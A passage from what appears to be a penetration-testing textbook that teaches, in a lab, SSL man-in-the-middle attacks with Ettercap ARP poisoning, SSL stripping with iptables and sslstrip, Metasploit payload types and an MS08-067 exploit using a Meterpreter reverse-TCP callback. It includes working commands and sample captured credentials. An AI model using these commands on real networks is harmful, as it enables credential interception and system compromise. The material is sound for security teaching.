### Extracting Sensitive Information from Encrypted Connections

For the next attack, we will exploit a user's willingness to bypass an SSL certificate warning to perform a man-in-the-middle (MITM) attack. This will allow us to intercept and read plaintext data from an otherwise secure SSL connection, which is designed to protect sensitive information such as credentials or credit card numbers from eavesdroppers.

### SSL Basics

The primary goal of SSL (Secure Sockets Layer) is to ensure that any sensitive information transmitted between a user’s browser and a server remains confidential and cannot be intercepted by malicious entities. SSL achieves this through the use of certificates. When you visit an SSL-protected site, your browser requests the site's SSL certificate. The site then presents its certificate, which the browser verifies. If the certificate is valid, the browser accepts it, and the server returns a digitally signed acknowledgment, establishing a secure SSL-encrypted communication channel.

An SSL certificate contains an encryption key pair and identifying information, such as the domain name and the company that owns the site. Typically, a certificate authority (CA), like VeriSign or Thawte, vouches for the server's SSL certificate. Browsers come preinstalled with a list of trusted CAs, and if a server’s SSL certificate is issued by a trusted CA, the browser can establish a secure connection. If the certificate is untrusted, the user will see a warning indicating that the connection may not be secure and should proceed with caution.

### Using Ettercap for SSL Man-in-the-Middle Attacks

In our previous ARP cache poisoning attack, we successfully intercepted traffic between our Windows XP and Ubuntu targets, as well as between the Ubuntu target and the Internet. We can apply a similar technique to attack SSL traffic. By redirecting traffic to and from `www.facebook.com` to our Kali system, we can intercept and read sensitive information.

For this example, we will use Ettercap, a versatile tool for MITM attacks. Before starting, ensure that any other spoofing tools are turned off. See page 22 for configuration instructions.

Ettercap offers multiple interfaces, but we will use the text-based interface with the `-T` option. To set up an ARP cache poisoning attack between the default gateway and the Linux target, use the `-M` option with `arp:remote /gateway/ /target/`, as shown below:

```bash
root@kali:~# ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/
```

With Ettercap running, wait for users to start interacting with SSL-protected web servers. On the Linux target, attempt to log in to a website using SSL. You should see a certificate warning, as illustrated in Figure 7-12.

Since this is a MITM attack, the SSL session's security cannot be verified. The certificate presented by Ettercap is not valid for `www.facebook.com`, breaking the trust chain, as shown in Figure 7-13.

However, many users ignore security warnings and proceed. If they click through the warning and enter their credentials, Ettercap will capture them in plaintext before forwarding them to the server, as demonstrated here:

```plaintext
HTTP : 31.13.74.23:443 -> USER: georgia PASS: password INFO: https://www.facebook.com/
```

### SSL Stripping

A significant challenge with SSL MITM attacks is that users must click through the SSL certificate warning. Depending on the browser, this can be a cumbersome process that some users may not ignore. Most users have likely clicked through a security warning at some point, despite knowing better.

To avoid these warnings, we can use SSL stripping. In this technique, we intercept the HTTP connection before it is redirected to SSL, add SSL functionality, and then send the packets to the web server. When the server responds, SSL stripping intercepts the traffic, removes the HTTPS tags, and sends the packets back to the client in plain HTTP. This is illustrated in Figure 7-14.

### Using SSLstrip

SSLstrip is a tool that implements SSL stripping. First, set an Iptables rule to pass traffic headed to port 80 through SSLstrip. Run SSLstrip on port 8080, and then restart Arpspoof to spoof the default gateway. For detailed instructions, refer to “Using ARP Cache Poisoning to Impersonate the Default Gateway” on page 165.

```bash
root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

Start SSLstrip and tell it to listen on port 8080:

```bash
root@kali:# sslstrip -l 8080
```

Now, browse to a site that uses SSL (e.g., a login page) from your Linux target. As shown in Figure 7-15, HTTP replaces HTTPS in the address bar. When you log in, your credentials will be captured in plaintext by SSLstrip.

This attack is more sophisticated than a standard SSL MITM attack because it avoids the certificate warning by completing an SSL connection between the server and SSLstrip, rather than the browser.

### Summary

In this chapter, we explored various techniques to manipulate network traffic and intercept sensitive information. We used ARP cache poisoning to redirect traffic to our Kali system, DNS cache poisoning to redirect users to our web servers, and Ettercap to automate SSL MITM attacks. We also employed SSL stripping to avoid invalid certificate warnings and capture plaintext data. These methods can provide valuable information for penetration testing, such as capturing valid credentials for further exploitation.

### Exploitation

After the preparatory work, we move on to the exploitation phase. In this phase, we run exploits against identified vulnerabilities to gain access to target systems. Some vulnerabilities, like default passwords, are straightforward to exploit, while others are more complex.

In this chapter, we will exploit vulnerabilities identified in Chapter 6 to gain a foothold in target machines. We will revisit the MS08-067 vulnerability, exploit an issue in the SLMail POP3 server, and leverage a readable and writable NFS share to take control of SSH keys. We will also interact with a fragile web server to exploit a directory traversal issue and download system files. For a refresher on how we discovered each of these issues, refer back to Chapter 6.

### Revisiting MS08-067

From Chapter 6, we know that the SMB server on our Windows XP target is missing the MS08-067 patch. This vulnerability has a high success rate, and the corresponding Metasploit module is highly effective. We used this vulnerability as an example in Chapter 4, but the knowledge gained in previous chapters provides solid evidence that this exploit will result in a compromise.

When we viewed the options for the `windows/smb/ms08_067_netapi` module in Chapter 4, we saw the usual `RHOST` and `RPORT` options, as well as `SMBPIPE`, which allows us to set the pipe used by the exploit. The default is the browser pipe, and we found that only the browser pipe is available. Thus, the default `SMBPIPE` option, `BROWSER`, is the only one that will work.

### Metasploit Payloads

Payloads in Metasploit allow us to instruct the exploited system to perform actions on our behalf. Common payloads include bind shells, reverse shells, and specific function payloads. For example, `osx/armle/vibrate` can make an iPhone vibrate, and `linux/x86/adduser` or `windows/adduser` can add a new user account. We can also download and execute a file with `windows/download_exec_https` or run a command with `windows/exec`.

To see all available payloads, enter `show payloads` at the root of Msfconsole after selecting the `windows/smb/ms08_067_netapi` module. In Chapter 4, we used `windows/shell_reverse_tcp`, but there is also a `windows/shell/reverse_tcp` payload.

Both payloads create Windows command shells using a reverse connection. The exploited machine will connect back to our Kali machine at the specified IP address and port. Any of the listed payloads will work, but in different scenarios, you may need to be creative.

#### Staged Payloads

The `windows/shell/reverse_tcp` payload is staged. It contains a stager payload with just enough information to connect back to the attack machine and request further instructions from Metasploit. When the exploit is launched, Metasploit sets up a handler to catch the incoming connection and serve the rest of the payload, such as a reverse shell. Staged payloads are useful when memory space is limited, allowing the use of complex payloads without requiring much space.

#### Inline Payloads

The `windows/shell_reverse_tcp` payload is inline, meaning it contains all the code necessary to push a reverse shell back to the attacker machine. While inline payloads take up more space, they are more stable and consistent. You can distinguish inline and staged payloads by their module names. For example, `windows/shell/reverse_tcp` and `windows/meterpreter/bind_tcp` are staged, while `windows/shell_reverse_tcp` is inline.

#### Meterpreter

Meterpreter is a custom payload for Metasploit, loaded directly into the memory of an exploited process using reflective DLL injection. It resides entirely in memory and does not write to the disk, making it less detectable by intrusion detection/prevention systems (IDS/IPS). Meterpreter uses TLS encryption for communication with Metasploit and provides additional commands, such as `hashdump` for accessing local Windows password hashes.

In Chapter 4, the default payload for `windows/smb/ms08_067_netapi` was `windows/meterpreter/reverse_tcp`. Let's use this payload for our MS08-067 exploit. Set the payload and run the exploit as shown:

```bash
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
```

This completes the setup and execution of the MS08-067 exploit using the Meterpreter payload.